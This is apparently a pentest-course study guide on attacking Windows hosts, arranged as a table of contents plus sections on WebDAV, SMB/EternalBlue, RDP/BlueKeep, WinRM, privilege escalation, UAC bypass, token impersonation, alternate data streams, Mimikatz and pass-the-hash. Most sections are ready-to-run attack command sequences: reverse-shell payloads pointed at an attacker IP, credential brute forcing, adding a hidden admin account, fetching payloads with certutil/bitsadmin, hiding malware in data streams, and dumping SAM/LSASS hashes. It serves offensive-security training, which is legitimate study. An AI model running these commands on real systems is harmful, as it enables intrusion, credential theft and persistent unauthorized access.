# Table of contents (WiP)

- [Intro to attacks](#1)
- [Windows](#2)
  - [Windows vulnerabilities](#2.1)
    - [Types of vulnerabilities](#2.1.1)
  - [Frequently exploited Windows vulnerabilities](#2.2)
  - [Exploiting Windows vulnerabilities](#2.3)
    - [Exploiting Microsoft IIS WebDAV](#2.3.1)
      - [What is Microsoft IIS?](#2.3.1.1)
      - [Exploitation](#2.3.1.2)
    - [Exploiting SMB](#2.3.2)
      - [SMB authentication](2.3.2.1)
      - [PsExec](#2.3.2.2)
      - [Exploitation](#2.3.2.3)
      - [MS17-010 Exploitation](#2.3.2.4)
    - [RDP Exploitation](#2.3.3)
      - [What is RDP?](#2.3.3.1)
      - [Exploiting RDP](#2.3.3.2)
      - [Exploiting BlueKeep (CVE-2019-0708)](#2.3.3.3)
    - [WinRM Exploitation](#2.3.3)
      - [What is WinRM?](#2.3.3.1)
      - [Exploiting WinRM](#2.3.3.2)
  - [Windows Privilege Escalation](#2.4)
    - [Windows Kernel Exploits](#2.4.1)
      - [What is a kernel?](#2.4.1.1)
      - [Common tools for kernel exploitation](#2.4.1.2)
      - [Using kernel exploits in Windows 7 SP1](##2.4.1.3)
    - [Bypassing UAC with UACme](#2.4,2)
      - [What is UAC?](#2.4,2.1)
      - [UACme](#2.4,2.2)
    - [Access token impersonation](#2.4.3)
      - [What are access tokens?](#2.4.3.1)
      - [Windows Privileges](#2.4.3.2)
      - [The Incognito Module](#2.4.3.3)
  - [Windows File System vulnerabilities](#2.5)
    - [Alternate Data Streams](#2.5.1)
      - [What are Alternate Data Streams](#2.5.1.1)
      - [Lets use them!](#2.5.1.2)
  - [Windows Credential Dumping](#2.6)
    - [The SAM database](#2.6.1)
      - [The LM Hash (LanMan)](#2.6.1.1)
      - [The NTLM Hash (New Technologies LanMan)](#2.6.1.2)
    - [Searching for passwords in Windows configuration files.](#2.6.2)
    - [Dumping Hashes with Mimikatz.](#2.6.3)
    - [Pass-The-Hash Attacks.](#2.6.4)

# More to come.

<a id=1></a>
# Intro to attacks

System-based or host-based attacks are attacks that target specific system or host running a specific operating
system such as Linux or Windows.

We need to understand that network services are not the only ones that we can target. There is a world of services out there.
Some more secure than others. Some easier to exploit, some harder.

This kinds of attacks usually come in to play after you've gained access to a target network, where you'll need to exploit
servers, laptops or endpoints on the internal network.

This kinds of attacks focus on exploiting the inherent flaws of an operating system.

Unlike network attacks, host based attacks are more specialized and require an understanding of the underlying OS in place and
the vulnerabilities that plague those OS's.

<a id=2></a>
# Windows

<a id=2.1></a>
## Windows vulnerabilities

Windows is a largely used OS. For that, it has had it large amount of exploits released and vulnerabilities
discovered and exploited. MS08-067 (Conflicker), MS17-010 (EternalBlue) are examples of this.

Given the updates and new versions of Windows being released, many users do not upgrade to the latest and greatest.
Many times this makes them vulnerable to many kinds of attacks. For example: if a vulnerability is found in Windows 7
nowadays, it probably won't be fixed, since that version has reached EOL (End of Life).

Windows by itself when installed is insecure by default. It is not configured to run proactively and securely. It gives
user control over the security controls that might or might not be implemented into their systems, but this is dangerous.
What was the last time you saw or heard a Windows user talking about configuring their firewall? Changing their login password
every X months? ;)

<a id=2.1.1></a>
### Types of vulnerabilities

- Information disclosure: allows an attacker to access confidential information.
- Buffer overflows: allows attacker to write data to a buffer and overrun the allocated one, consequently
  writing data to allocated memory addresses.
- Remote code execution: allows attackers to remotely execute arbitrary code and commands.
- Privilege escalation: vulnerability that allows attackers to elevate their privileges.
- Denial of Service: allows attackers to waste machine resources to prevent normal functionality of a server 
  or services.

<a id=2.2></a>
## Frequently Exploited Windows Services

Windows has various native services and protocols that can be configured to run 
on a host. These services provide an attacker with an attack vector. These 
can be used to gain access to a target host.

| Protocol           | Ports           | Purpose                                                                                                    |
|------------------- | --------------- | ---------------------------------------------------------------------------------------------------------- |
| Microsoft IIS      | TCP 80/443      | Web server.                                                                                                |
| WebDAV             | TCP 80/443      | HTTP extension that allows clients to update, delete, move and copy files on a web server. Similar to GIT. |
| SMB/CIFS           | TCP 445         | Network file sharing protocol. Used to facilitate the task of sharing files.                               |
| RDP                | TCP 3389        | Remote access protocol. Used to remotely interact with a device.                                           |
| WinRM              | TCP 5986/443    | Remote management protocol used to facilitate access to Windows systems.                                   |

<a id=2.3></a>
## Exploiting Windows vulnerabilities

<a id=2.3.1></a>
### Exploiting Microsoft IIS WebDAV

<a id=2.3.1.1></a>
#### What is Microsoft IIS?

It is a proprietary extensible web server developed by Microsoft for the Windows NT kernel.

It can be used to host web applications as well as webpages and provides administrators with
a robust GUI for managing websites.

It can host both static and dynamic websites written in ASP.NET and PHP.

Tipically runs on port 80 and 443 (SSL). It supports the following file extensions:

- .asp 
- .aspx
- .config
- .php

<a id=2.3.1.2></a>
#### But what is a WebDAV?

WebDAV (Web-based Distributed Authoring and Versioning) is a set of HTTP extensions that allow users
to collaboratively edit and manage files on remote web servers.

It essentially enables a git extension on the HTTP protocol. And as so, it also runs usually on ports 80 and 
443. 

To connect to WebDAV, you have to pass valid credentials. This is because it implements authentication in the form
of user and password.

<a id=2.3.1.3></a>
#### Exploitation

The first steps to exploit WebDAV is to check for the following:

- Is it running on an IIS server?
- Try bruteforcing credentials.
- Authenticate and upload a malicious ASP payload to execute 
  arbitrary commands.

Some tools we can use are:

- davtest: Scan, authenticate and exploit a WebDAV server.
- cadaver: Upload and download files, on-screen display, editing,
  namespace operations, collection creation and deletion, property
  manipulation and more. It's a CLI client.

```bash
$ nmap -sV [TARGET] # Identify the IIS server.
# A useful script is http-webdav-scan. If an IIS server is found, it'll be used automatically.
$ nmap -sV [TARGET] -p80/443 --script=http-enum 
# Just enumerate the target. You can use ffuf, gobuster, etc.
$ hydra -L /path/to/users -P /path/to/passwords [TARGET] http-get /webdav-directory
$ davtest -auth user:password -url [TARGET/webdav-endpoint] 
$ cadaver http://[IP]/webdav-endpoint
Username: user
Password: pass
# Now we should have a pseudoterminal.
> put /path/to/shell
# Depending on the output of davtest, you could upload different types of files. In this case,
# webshells. But you'll need to pick one that will actually work!
$ msfvenom -p windows/meterpreter/reverse_tcp LHOST=[ATTACKER IP] LPORT=[ATTACKER PORT] -f asp > shell.asp
# Upload and execute through cadaver.
# The payload generated will be 32 bit by default. 
msf5 > use exploit/windows/iis/iis_webdav_upload_asp
msf5 exploit > set HttpUsername [USERNAME]
msf5 exploit > set HttpPassword [PASSWORD]
msf5 exploit > set RHOSTS [TARGET]
# You can pick a custom payload, but the windows/meterpreter/reverse_tcp one is pretty good.
# Also: if you use this module, you don't have to manually create a payload. The console will
# do it for you.
# Plus: when ran, it uploads, runs and deletes the ASP payload.
msf5 > use exploit/multi/handler
msf5 exploit > set LHOST [ATTACKER IP]
msf5 exploit > set LPORT [ATTACKER PORT]
msf5 exploit > set payload windows/meterpreter/reverse_tcp
```

<a id=2.3.2></a>
### Exploiting SMB

Since we already know what SMB is from previous modules, we'll jump to the exploitation part.

Note: SMB usually runs on port 445. Older versions run alongside NetBIOS in port 139.

Samba is the open source implementation of SMB. We will focus on SMB first, and we'll see Samba
later.

<a id=2.3.2.1></a>
#### SMB authentication

There are two SMB auth levels:

- User authentication: users must prove a username and password in order to authenticate
with the SMB server in order to access a share.
- Share authentication: Users must provide a password in order to access a restricted share.

Both levels use a challenge response authentication system.

A -> B Authentication Request
B -> A Encrypted string with user's hash
A -> B Encrypted string
B -> A Access granted.

<a id=2.3.2.2></a>
#### PSExec

Lightweight Telnet implementation developed by Microsoft that allows access to execute processes on 
remote systems using any user's credentials. It authenticates via SMB.

We can use PSExec to legitimately authenticate to a server and run arbitrary command or launch a remote
command prompt.

Common techniques to gain access to credentials is through SMB brute forcing. Only after we gain credentials
we will be able to execute commands.

<a id=2.3.2.3></a>
#### Exploitation
```bash
msf5 > use auxiliary/scaner/smb/smb_login
msf5 > set RHOSTS [TARGET]
msf5 > set USER_FILE /path/to/usernames
msf5 > set PASS_FILE /path/to/passwords
msf5 > set verbose FALSE
# Now lets use PsExec.
$ psexec.py [USERNAME]@[IP] [PROGRAM TO EXECUTE]
Password: [PASSWORD]
C:\Windows\system32> echo jaked!!!!!
jaked!!!!!
msf5 > set exploit/windows/smb/psexec
msf5 > set RHOSTS [TARGET]
msf5 > set SMBUser [USERNAME]
msf5 > set SMBPass [PASSWORD]
msf5 > set LHOST [ATTACKER IP]
msf5 > set LPORT [ATTACKER PORT]
```

<a id=2.3.2.4></a>
#### MS17-010 SMB Exploitation

```bash
$ nmap -p445 --script smb-vuln-ms17-010 [TARGET]
# Script to check if the MS17-010 vulnerability exists or not.
$ git clone https://github.com/3ndG4me/AutoBlue-MS17-010
$ cd AutoBlue-MS17-010/shellcode
$ chmod +x shell_prep.sh
$ ./shell_prep.sh
# Do what the programs tells you to do.
# It will generate both x86 and x64 bit shellcodes. We will use 
# those for exploitation.
# Choose between sc_x86.bin or sc_x64.bin, depending on architecture.
# If unknown, go for a 32 bit payload. 
$ cd ..
# Open another shell and prepare a Netcat listener.
$ nc -nlvp [PORT]
# Then on the AutoBlue-MS17-010 directory run the following
$ python eternalblue_exploit[7-8-10].py [ATTACKER IP] shellcode/[sc_x86.bin/sc_x64.bin]
# Now the Metasploit way.
msf5 > use exploit/windows/smb/ms17_010_eternalblue
msf5 exploit > use payload windows/meterpreter/reverse_tcp # If the target is x86.
msf5 exploit > use payload windows/x64/meterpreter/reverse_tcp # If the target is x64.
msf5 exploit > set RHOSTS [TARGET]
msf5 exploit > set LHOST [ATTACKER IP]
msf5 exploit > set LPORT [ATTACKER PORT]
msf5 exploit > exploit
```

<a id=2.3.2.5></a>
#### Lab setup

Download a Windows Server image like this one https://archive.org/details/WinSrv2008R2FoundationSP1
set up a virtual machine with VirtualBox or whatever virtualization software you have at hand.

We will probably use it further on in the course, so it'll come in handy.

<a id=2.3.3></a>
### RDP Exploitation

<a id=2.3.3.1></a>
#### What is RDP?

The Remote Desktop Protocol is a protocol developed by Microsoft to create GUI connections for system's 
remote control. It uses TCP port 3389 by default, although it is often changed. 

It requires a legitimate user and password for authentication. For this reason, the most used attack 
vector is bruteforcing.

It uses TCP 3389 but can be reconfigured. Usually the RDP protocol is listening on a 
different port than 3389.

One of the main attack vector RDP is targeted with is brute force and BlueKeep.

<a id=2.3.3.2></a>
#### Exploiting RDP

```bash
$ nmap -sV -p-/3389 [TARGET]
msf5 > use auxiliary/scanner/rdp/rdp_scanner
msf5 > setg RHOSTS [TARGET]
msf5 > set RPORT [PORT]
# You can try to spoof your IP for this scan using the following.
msf5 > set RDP_CLIENT_IP [SPOOF IP]
$ hydra -L /path/to/users -P /path/to/passwords rdp://[TARGET] {-s [PORT]} {rdp} {-t [TASKS]}
$ crackmapexec rdp [TARGET] {-t [THREADS]} -u /path/to/user -p /path/to/passwords
$ xfreerdp /u:[USER] /p:[PASSWORD] /v:[TARGET]:[PORT]
```

<a id=2.3.3.3></a>
#### Exploiting BlueKeep (CVE-2019-0708)

BlueKeep is the name given to an RDP vulnerability that could potentially allow attackers
into a piece of the kernels memory, allowing remote code execution and denial of service attacks.

The vulnerability can be quite confusing for some fellas, as the vulnerability itself takes space on 
a chunk of kernel memory, consequently allowing attackers to execute commands with SYSTEM privileges.
Ring zero, remember?

In my own labs, this vulnerability tends to be unreliable for command execution. My VMs usually get 
DoS'sed to hell, but I can't get myself to run a single command :(

This vulnerability affects Windows XP until Windows 2008 R2.

It's said that many PoCs are malicious in nature. That is, that they do stuff apart from just exploiting 
the vulnerability itself. Wink wink.

Note: targeting kernel memory **WILL** cause crashes. 

```bash
msf5 > use auxiliary/scanner/rdp/cve_2019_0708_bluekeep
msf5 auxiliary > setg RHOSTS [TARGET]
msf5 auxiliary > setg RPORT [PORT]
msf5 auxiliary > set RDP_CLIENT_IP [SPOOF IP]
msf5 auxiliary > exploit
msf5 > use exploit/windows/rdp/cve_2019_0708_bluekeep
msf5 exploit > show targets
# Pick the target.
msf5 exploit > set target [TARGET_OS]
msf5 exploit > set GROOMSIZE 100
# The GROOMSIZE is a variable set to choose how much kernel memory we will take.
# Sometimes less is better.
msf5 exploit > set ForceExploit true
# The exploit is also unreliable. Sometimes even the scanner will tell you that a vulnerable
# machine isn't actually vulnerable. With this option you skip the check whatsoever.
msf5 exploit > set LHOST [ATTACKER IP]
msf5 exploit > set LPORT [ATTACKER PORT]
# By default the payload is an x64 bit meterpreter reverse shell. This can be changed of course.
msf5 exploit > exploit
```

<a id=2.3.4></a>
### WinRM Exploitation

<a id=2.3.4.1></a>
#### What is WinRM?

WinRM (or Windows Remote Management) is a proprietary Microsoft protocol intended as a 
QoL improvement for system administrators. It's used through HTTP/HTTPS. 

Typically used for the following reasons:

- Remotely access and interact with Windows hosts on a local network.
- Remotely access and execute commands on Windows systems.
- Manage and configure Windows systems remotely.

It runs on 5985 or 5986 depending on whether HTTPS is configured or not.

WinRM implements access control and security for communication between hosts with 
different types of authentication.

We can use crackmapexec to bruteforce WinRM, or we could also use "evil-winrm", a Ruby
script written for the sole purpose of executing remote commands through the WinRM 
protocol.

<a id=2.3.4.2></a>
#### Exploiting WinRM

The ports 5986-5986 are not in the top 1000 most commonly used ports. So if we are looking
for the WinRM service, we'll need to be more throughout.

```bash
$ nmap -sV -p- [TARGET]
# This way we'll ve able to scan all 65K ports.
$ nmap -sV -p5985-5986 [TARGET]
# Or we could be lazy if we knew that WinRM is used. Otherwise, a complete
# scan of all ports is recommended.
$ crackmapexec winrm [TARGET] -u /path/to/usernames -p /path/to/passwords
$ crackmapexec winrm [TARGET] -u [USERNAME] -p [PASSWORD] -x '[COMMAND TO EXECUTE]'
$ evil-winrm -u [USERNAME] -p '[PASSWORD]'  -i [TARGET]
msf5 > use exploit/windows/winrm/winrm_script_exec
msf5 exploit > setg RHOSTS [TARGET]
msf5 exploit > set RPORT [PORT]
msf5 exploit > set USERNAME [USERNAME]
msf5 exploit > set PASSWORD [PASSWORD]
msf5 exploit > set FORCE_VBS TRUE
```

<a id=2.4></a>
## Windows Privilege Escalation

Privilege escalation is the process of exploiting vulnerabilities or misconfigurations
in systems in order to gain elevated access, like SYSTEM privileges or root.

It's a vital part of the attack cycle, since an attacker will most possibly need some 
privileges to execute malicious commands or to delete any trace. 

After gaining access to a system, most of the time you'll need to elevate your privileges
in order to perform tasks and functionalities that require higher privileges.

Developing ones privesc abilities is essential to become a good pentester.

<a id=2.4.1></a>
### Windows Kernel Exploits

<a id=2.4.1.1></a>
#### What is a kernel?

A kernel is a computer program that controls everything. It's the direct layer of communication
between the software and hardware. 

The Windows NT kernel is the kernel pre-packaged with Windows. It's of hybrid type, meaning that it 
combines both micro kernel and monolithic kernels. More on that later. Nevertheless, the NT kernel
consists of two main spaces:

- User space: where the user and does its thing. Mainly reserved for non-vital programs and services.
- Kernel space: where the system does its thing. Reserved for required processes and services. Using this mode 
grants unrestricted access to every system resource.

![](Priv_rings.svg)

Credits to Hertzsprung at https://commons.wikimedia.org/w/index.php?curid=8950144

Kernel exploits will typically target vulnerabilities in the kernel to execute arbitrary code in order to run
privileged system commands or to obtain a system shell. The process will differ depending on the Windows version.

Privilege escalation through kernel exploits typically follows the following methodology:

- Identify a kernel exploit in a given system.
- Download code and execute it in the system.

<a id=2.4.1.2></a>
#### Common tools for NT exploitation

- Windows Exploit Suggester: this tools compares the target patch levels against the Microsoft vulnerability
database in order to detect missing patches. It also notifies the user if there are any public known exploits
available. [Find it here.](https://github.com/AonCyberLabs/Windows-Exploit-Suggester)

*The project is kinda dead... so try using [PEASS-ng](https://github.com/carlospolop/PEASS-ng/tree/master). Newer, up-to-date tool.*

- Windows-Kernel-Exploits: collection of Windows kernel exploits sorted by CVE. [Find it here](https://github.com/SecWiki/windows-kernel-exploits)

*This project is also kinda dead... so [check this out](https://github.com/ycdxsb/WindowsPrivilegeEscalation).*

<a id=2.4.1.3></a>
#### Using kernel exploits in Windows 7 SP1

Many exploits are assumed to be ran within a Windows installation. That is, after you've 
gained access to a system.

```bash
# Useful command within a meterpreter session.
# Remember that not everything will be inside the MS framework. If you don't find something,
# then try to search online or try to build something yourself.
meterpreter > getuid
meterpreter > getprivs
meterpreter > getsystem
# If you're lucky, getsystem will do the dirty work for you and give you SYSTEM privileges.
# Doesn't always work, though.
msf6 > use post/multi/recon/local_exploit_suggester
msf6 > set SESSION [SESSION_ID]
# Most local exploit modules will require you to pick an open session, since this are local exploits.
msf6 > exploit
# If you find something, don't just exploit it. Research what you'll use. Check if the exploit
# does what it actually says it does. Sometimes some not very trustworthy stuff might be found, 
# and remember that kernel exploits are dangerous. so be cautious.
```

```batch
Rem These are some command to run whenever you gain access to a Windows computer.
Rem Some of this won't work at first, due to privilege issues. Try them later whenever you get
Rem to elevate your privileges.
C:\Users\user> whoami /all
C:\Users\user> echo %username%
C:\Users\user> net user
C:\Users\user> net user notahacker safepasswd /add
C:\Users\user> net localgroup administrators notahacker /add
Rem useful for kernel exploitation.
C:\Users\user> driverquery | findstr Kernel
C:\Users\user> systeminfo
Rem copy the output to a text file, we'll use it later.
```

Let's use Windows Exploit Suggester. Get yourself a Microsoft MS Vulnerability database! For that, go to [this page](https://msrc.microsoft.com/update-guide/vulnerability). Download the columns as XLSX. We will use that file right about now!

```bash
$ windows-exploit-suggester.py --database [YOUR_XLSX_FILE] --systeminfo [SYSTEMINFO_FILE]
# This will enumerate a list of vulnerabilities. Some might not have a publicly available exploit,
# but you could build something yourself...
# If you want to transfer a file to a machine, try to put it in not very visited directories.
# Maybe try Temp.
```

But how to upload a file? Many methods exist to do this task, although some are more obscure than others. In Windows 2008 and before,
there was no Invoke-WebRequest! No Wget! Only certutil and bitsadmin could be used to download files from the command shell... crazy I know.

So let's try some commands. 

```batch
C:\> bitsadmin /transfer [TASK_NAME] [URL TO GET FILE FROM] C:\Path\To\Save\File
C:\> certutil.exe -urlcache -f [URL TO GET FILE FROM] C:\Path\To\Save\File
Rem both of this are almost universal throughout all Windows machines. For Windows XP...
Rem maybe the machine has an FTP server you could use. 
C:\> Invoke-WebRequest [URL TO GET FILE FROM] -OutFile C:\Path\To\Save\File
```
This are a couple ways you can get your exploits and your haxx inside a machine. Now, using meterpreter is waaaaay easier... just use the `upload`
command. 1337 haxxors hate it!


<a id=2.4.2></a>
### Bypassing UAC with UACme

<a id=2.4.2.1></a>
#### What is UAC?

UAC or User Account Control is a Windows security measure introduced in Windows Vista. It has been part of the system ever since.
UAC requires a user to allow or deny changes being made to a computer. This permissions can be revoked to users within a group or to 
single users. 

If a non-privileged user tries to run an executable that will change parts of the OS, like an installer of some sorts, it will prompt the user
with a credential prompt, while a privileged user will just be asked for consent.

Attackers can bypass this security measure to execute files with SYSTEM privileges.

In order to successfully bypass UAC, we first need to have a local administrator account within a system. This might not necessarily be the 
Administrator account, as many users have their default accounts as part of the Administrators group by default.

If we execute a program, it will prompt us with a windows to ask for our consent. 

UAC has various levels of integrity ranging from low to high. If the UAC protection level is set below high, Windows programs can be executed
with elevated privileges without prompting the user for confirmation.

Many tools and techniques exist to bypass this security measure. However, the tool and technique will depend on the Windows version you're in.

<a id=2.4.2.2></a>
#### UACme

UACme is an open-source privilege escalation tool developed by @hfire0x. It can be used to bypass the UAC by leveraging various techniques.

The repo has a well documented list of bypass methods that can be used on multiple versions of Windows from 7 to 10.

You can find it [here](https://github.com/hfiref0x/UACME).

<a id=2.4.3></a>
### Access token impersonation

<a id=2.4.3.1></a>
#### What are access tokens?

Windows Access tokens are a core element of the Windows authentication process. They're created by the Local Security Authority
Subsystem Service (LSASS).

An access token is responsible for identifying and describing the security context of a process or thread running on a system.
In simple words: an access token can be thought of as a temporary key similar to a web cookie that provides users with access to 
resources or networks without having to provide credentials in multiple occasions.

They're generated by the winlogon.exe process, which is created at login, or every time a user authenticates successfully and includes
the identity and privileges of the user account associated with the thread or process.

The token is then attached to the userinit.exe process which all child processes started by a user will inherit a copy of the 
access token from their creator and will run under the privileges of the same access token.

Tokens are categorized based on their security tier assigned to them. This levels are used to determine the privileges assigned to 
each token.

There are mainly (not just) two security types:

- Impersonate-level: created as a direct result of a non-interactive login on Windows, tipically through specific
system services or domain logons.
- Delegate-level: created as a direct result of an interactive login on Windows, primarily through traditional login
or other methods like RDP.

Impersonate tokens can be used to to impersonate tokens within a local system and not on any external device.

Delegate tokens are a threat due to its ability to impersonate any token on any device associated with the token.

<a id=2.4.3.2></a>
#### Windows Privileges

The token impersonation process will depend on the user we have access to, as well as the delegate tokens available
to us.

For a successful token impersonation attack, the following privileges are required:

- SeAssignPrimaryToken: This allows a user to impersonate tokens.
- SeCreateToken: This allows a user to create an arbitrary token with administrative privileges.
- SeImpersonatePrivilege: This allows a user to create a process under the security context of another
user, one tipically with administrative privileges.

<a id=2.4.3.3></a>
#### The Incognito Module

Incognito is a built-in module part of the Metasploit Framework. It used to be its own standalone application,
but it became a part of the Meterpreter module.

We can use this function to check which tokens we can successfully impersonate within a machine, if any.

```bash
# I will assume you already have an initial foothold in a machine.
meterpreter > load incognito
meterpreter > list_tokens -u
# Enumerate user tokens available.
meterpreter > impersonate_token "GROUP/USER"
# Impersonate a user token.
```

<a id=2.5></a>
## Windows File System vulnerabilities

<a id=2.5.1></a>
### Alternate Data Streams 

<a id=2.5.1.1></a>
#### What are Alternate Data Streams?

Alternate Data Streams (ADS) is an NTFS file attribute and was designed to provide compatibility
with macOS HFS file system.

Any file created within an NTFS drive will have two main data streams:

- Data stream: Default stream that contains the data from the file.
- Resource stream: Stream that contains metadata of the file.

Attackers can use ADS to hide malicious scripts or files inside the ARS (Attribute Resource Stream)
of a legitimate file.

This technique is used mainly to avoid signature-based antivirus software and other type of static analisys
tools.

<a id=2.5.1.2></a>
#### Lets use them!

This can be done in the following way:

```batch
C:\> notepad.exe file.txt:secretfile.txt
Rem this will create a file called file.txt that contains a hidden file called secretfile.txt. when
Rem notepad opens up, you'll be editing the secretfile.txt. The file.txt will be empty.
C:\> type malwaar_box.exe > nothing_bad.txt:malwaar.exe
Rem this will hide the malwaar_box.exe in the nothing_bad.txt file. BUT! The original file will not be 
Rem deleted, so you have to delete it yourself.
Rem at this point the executable will be hidden, but you won't be able to run it. For that, we have to make 
Rem a symbolic link.
C:\> mklink good_program.exe C:\nothing_nad.txt:malwaar.exe
```

<a id=2.6></a>
## Windows Credential Dumping

The Windows operating system stores hashed user passwords locally in the SAM (Security Accounts Manager).

Hashing is the process of converting a piece of data into another value. A hashing function or algorithm is used
to generate a new value. The result of hashing algorithms is known as a hash or hash value.

Authentication and verification of user credentials is facilitated by the Local Security Authority (LSA).

Windows versions up to Windows 2003 utilize two types of hashes:

- LM
- NTLM

Windows disables LM hashing and enables NTLM hashing from Vista onwards.

<a id=2.6.1></a>
### The SAM database

The SAM is a database file that is responsible of managing all user account hashes on Windows.

The database cannot be copied while the OS is running.

The NT kernel usually keeps the SAM file locked and as a result, attacker typically use in-memory
techniques and tools to dump SAM hashes from the LSASS process.

In modern versions of Windows, the SAM is encrypted with a syskey.

Note: to interact with the LSASS service, we need to have administrator privileges.


<a id=2.6.1.1></a>
#### The LM Hash (LanMan)

The LM hashing algorithm was implemented in Windows operating system versions prior to NT4.0.

The protocol is used for hashing passwords, and the process can be broken down into this steps:

1. All passwords are broken down into two chunks.
2. All characters are then turned into uppercase.
3. Each chunk is then hashed separately with the DES algorithm.

LM hashing is considered to be insecure due to the fact that the hash does not contain a salt or peppering,
and this makes bruteforce attacks and rainbow table attacks effective against LM hashes.

<a id=2.6.1.2></a>
#### NTLM Hash (New Technologies LanMan)

NTLM is a collection of authentication protocols that are used in Windows to facilitate
authentication between computers. The process involves using a valid username and password
to successfully authenticate.

From Vista onwards Windows disables LM and uses NTLM.

When a user account is created, the password is encrypted using the MD4 hashing algorithm, while
the original password is disposed of.

NTLM improves in the following aspects:

- Doesn't split the password into two chunks.
- Is case sensitive.
- Allows the use of symbols and unicode characters.

<a id=2.6.1></a>
### Searching for passwords in Windows configuration files.

Windows can automate a variety of repetitive tasks, such as mass rollout or installing
Windows in several systems.

This is typically done through the use of the Unattended Installation Setup Utility,
which is used to automate the Windows installation process.

This tool uses configurations provided by a system administrator that contain a specific
setup and credentials, especially those from the Administrator.

If the Unattended Install configuration is left on in the system after the installation process
is complete, they can reveal sensitive information like clear-text credentials that may be used
by malicious actors.

<a id=2.6.1.1></a>
#### Unattended Windows Setup

The Unattended Windows Setup Utility will typically use one of the following configuration files
that contain files that contain user accounts and system configuration information.

- C:\Windows\Panther\Unattend.xml
- C:\Windows\Panther\Autounattend.xml

As a security precaution, sometimes the credentials may be stored in the Unattended configuration files
may be encoded in Base64. Nevertheless, this can be easily decoded.

<a id=2.6.3></a>
### Dumping Hashes with Mimikatz

Mimikatz is the golden standard for the post-exploitation tools. It allows the extraction of clear-text passwords,
hashes and Kerberos tickets from memory.

Mimikatz can also extract hashes from the SAM through the memory of the LSASS process.

We can use precompiled Mimikatz binaries, alternatively, if we have a Meterpreter session in place, we can use the
inbuilt extension Kiwi.

Note: Mimikatz will require elevated privileges in order to run successfully.

Let's see how to use this tool.

```bash
# Let's try the Kiwi module first.
meterpreter > pgrep lsass.exe
meterpreter > migrate [LSASS PID]
meterpreter > load kiwi 
meterpreter > creds-all
# The kiwi module has a ton of options. Use the help/? command to check them out.
meterpreter > lsa_dump_sam
# This will dump the entire SAM database plus the Syskey. Useful later.
meterpreter > lsa_dump_secrets
# This will dump the LSA Secrets.
meterpreter > upload /path/to/mimikatz.exe
meterpreter > shell
C:\>.\Mimikatz.exe
mimikatz > privilege::debug
# If privileges are '29' OK, then we can continue.
mimikatz > lsadump::sam
mimikatz > lsadump::secrets
mimikatz > sekurlsa::logonpasswords
```

For more on Mimikatz, check this https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Mimikatz.md

<a id=2.6.4></a>
### Pass-The-Hash Attacks

We know we can obtain NTLM hashes, but now we'll learn what to do with them.

A pass the hash attack is an exploitation technique that involves retrieving or capturing NTLM hashes
or clear-text passwords and utilizing them to authenticate with the target legitimately.

We can use multiple tools to execute Pass-The-Hash attacks. Some of them are:

- Metasploit PsExec module
- Crackmapexec
- evil-winrm

This technique will allow us to obtain access to a system via legitimate credentials as opposed to obtaining
access via service exploitation.

Let's see how to execute this attack.

```bash
# First get a hash.
meterpreter > creds_all
meterpreter > hashdump
# Format is: User:SID:LM:NTLM:::
# Save the NTLM hash in a file or just copy it.
msf5 > use exploit expoit/windows/smb/psexec
msf5 exploit > setg RHOSTS [TARGET]
msf5 exploit > set SMBUser [USER]
msf5 exploit > set SMBPass [LM:NTLM]
msf5 exploit > set target [TARGET ACTION]
# Some of the actions are: Native Upload, Command, powerShell, etc
msf5 exploit > exploit
# Let's go to crackmapexec.
$ crackmapexec smb [TARGET] -u [USER] -H "[NTLM]" {-x [COMMAND]}
$ evil-winrm -i [IP] -u [USERNAME] -H "[NTLM]"
```
